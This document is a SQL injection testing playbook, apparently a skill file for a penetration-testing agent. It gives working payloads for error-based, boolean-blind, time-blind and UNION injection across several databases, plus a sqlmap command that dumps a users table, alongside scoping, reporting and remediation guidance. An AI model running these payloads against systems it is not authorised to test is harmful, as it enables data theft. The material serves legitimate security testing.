---
name: sql-injection
description: 'SQL injection testing across union, error-based, boolean/time-blind, stacked, and ORM-layer bypasses with a numeric-differential gate. Triggers: SQLi, SQL injection, "quote ထည့်", "db ထုတ်", "sql စမ်း".'
category: vulnerabilities
track: 02-vuln-class
tags: [sqli, injection, database, union, blind]
severity_ceiling: critical
requires: [baseline-http-capture]
tools: [sqlmap, curl, ffuf]
cwe: CWE-89
owasp: [A05:2025, API8:2023]
version: 1.0.0
author: kkuser
source: original
---

> Shared rules apply: `../_shared/evidence-policy.md`, `../_shared/scope-gate.md`.
> Report skeleton: `../_shared/report-template.md`.

# SQL Injection

## 1. Preconditions

- Baseline response for the benign value (status, byte length, body hash, timing).
- Knowledge of the parameter's role: numeric, string, `LIKE`, `IN (...)`, `ORDER BY`.
- A read-only proof strategy agreed with the client. Default: no `DROP`, no `UPDATE`,
  no full table dumps. One row is proof.
- If a WAF is present (`wafw00f -a $TARGET`), expect to need encoding variants — note it
  in the report as a detection control that did not prevent the class.

## 2. Gate

A numeric differential must appear. Two cells, same endpoint:

```bash
U='https://app.example.com/product?id='
curl -s -o /dev/null -w 'true  %{http_code} %{size_download} %{time_total}\n' "$U"2
curl -s -o /dev/null -w 'false %{http_code} %{size_download} %{time_total}\n' "$U"2-1
```

**Pass (injection present):** `id=2` and `id=2-1` return responses that match each other
but not `id=1`, or `id=2 AND 1=1` differs from `id=2 AND 1=2`.

**Fail:** identical bodies and identical timing across all four cells, repeated 3×.
Do not proceed on a single anomalous response.

## 3. Enumeration

```bash
# parameter inventory from traffic
grep -oE '[?&][A-Za-z0-9_]+=' proxy.log | sort -u
# hidden parameters
arjun -u 'https://app.example.com/api/search' -m GET
# bounded fuzz of candidate names
ffuf -u 'https://app.example.com/api/search?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

High-value sinks: search, sort/order, filter, pagination `offset`, report exports,
`id` in JSON bodies, GraphQL filter arguments, CSV import columns, login username.

## 4. Test Matrix

One row per (parameter, injection context). Never conclude from a single payload.

| # | Parameter | Context | Benign | True (`AND 1=1`) | False (`AND 1=2`) | Differs? |
|---|---|---|---|---|---|---|
| 1 | `id` | numeric | 200/4210 | 200/4210 | 200/1980 | yes → confirmed |
| 2 | `q` | string `'%..%'` | 200 | 200/4210 | 500 or 200/1980 | |
| 3 | `sort` | identifier | 200 | `sort=id` | `sort=(select 1)` | |

For `ORDER BY` and other identifier contexts, use `CASE`:
`sort=(CASE WHEN 1=1 THEN id ELSE name END)` — column values differ when injectable.

## 5. Proof

Escalation ladder — stop as soon as the client's proof threshold is met.

```text
# 1. arithmetic differential (safe, non-destructive)
? id=2' AND '1'='1     -> normal
? id=2' AND '1'='2     -> empty / different

# 2. DBMS fingerprint via error text or version function
? id=2 AND 1=CAST((SELECT version()) AS int)     # PostgreSQL error leaks version
? id=2 AND extractvalue(1,concat(0x7e,version()))  # MySQL
? id=2 AND 1=CONVERT(int,@@version)               # MSSQL

# 3. boolean-blind extraction (character by character, bounded)
? id=2 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'

# 4. time-blind when nothing is reflected
? id=2 AND (SELECT 1 FROM pg_sleep(5))=1          # PostgreSQL
? id=2 AND SLEEP(5)                                # MySQL
? id=2; WAITFOR DELAY '0:0:5'--                     # MSSQL

# 5. UNION — align column count first
? id=2 ORDER BY 1--   ... increment until error
? id=-1 UNION SELECT NULL,NULL,NULL--
```

Time-blind needs 5 samples; accept only if median true-case delay ≥ 4× baseline jitter.

Automation (throttled, read-only):

```bash
sqlmap -u 'https://app.example.com/product?id=1' \
  --batch --level=2 --risk=1 --technique=BEU --threads=1 --delay=0.5 \
  --dbms=mysql --current-db --current-user --count -D app -T users
```

## 6. Counterevidence

| Alternative explanation | How to kill it |
|---|---|
| WAF blocked the payload, app is safe | Compare with a benign equivalent (`id=2-1`); a block page is not a fix |
| Response difference is caching | Add `Cache-Control: no-cache` + random cache-buster |
| Difference is a generic 500 on odd input | Send `id=2'`, `id=2)` etc.; only SQL-shaped input must trigger it |
| Timing difference is network jitter | 5 samples, median, compare against a same-size non-SQL request |
| The "leak" is mock/demo data | Check whether values correspond to real users in the client's UI |
| ORM parameterises, only the sort param is raw | Test each parameter separately; do not generalise |

## 7. Impact

State the demonstrated read: *"Boolean-blind injection in `id` allowed extraction of the
`users` table's `email` and `password_hash` columns one character per request; 3 rows
were extracted as proof."*

Boundaries: read-only → confidentiality. Write/`xp_cmdshell`/`COPY TO PROGRAM` only when
demonstrated (then integrity/availability and possible host compromise — but say
"database server process", not "host", unless you proved host access).

## 8. CVSS 3.1

```text
Read-only, unauthenticated, boolean-blind:  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 (High)
With write demonstrated:                    CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical)
Authenticated-only, low-priv user:          PR:L, and C:H/I:N  -> 6.5
```

`AC:H` only when exploitation required a narrow race or a WAF bypass specific to this
deployment.

## 9. Report

```markdown
# Boolean-blind SQL injection in `id` parameter of /product

**Severity:** High (CVSS 3.1: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
**Affected asset:** app.example.com  GET /product?id=
**Category:** CWE-89 · OWASP A05:2025
```

Include the four-cell matrix result, the extraction command, and 3 extracted rows only.

## 10. Remediation

```python
# before
cur.execute(f"SELECT * FROM products WHERE id = {pid}")

# after — parameterised, type-validated
cur.execute("SELECT * FROM products WHERE id = %s", (pid,))
```

- Parameterise every value. Identifiers (`ORDER BY`) cannot be parameterised — map them
  through an allowlist dict.
- Least-privilege DB account: no `FILE`, no `xp_cmdshell`, no cross-schema read.
- Disable verbose SQL errors in production.
- WAF is a speed bump, not the fix.

Regression test: assert `id=1 AND 1=2` returns the same body as a nonexistent id.

## 11. References

- OWASP WSTG — Testing for SQL Injection (WSTG-INPV-05)
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- PortSwigger Web Security Academy — SQL injection
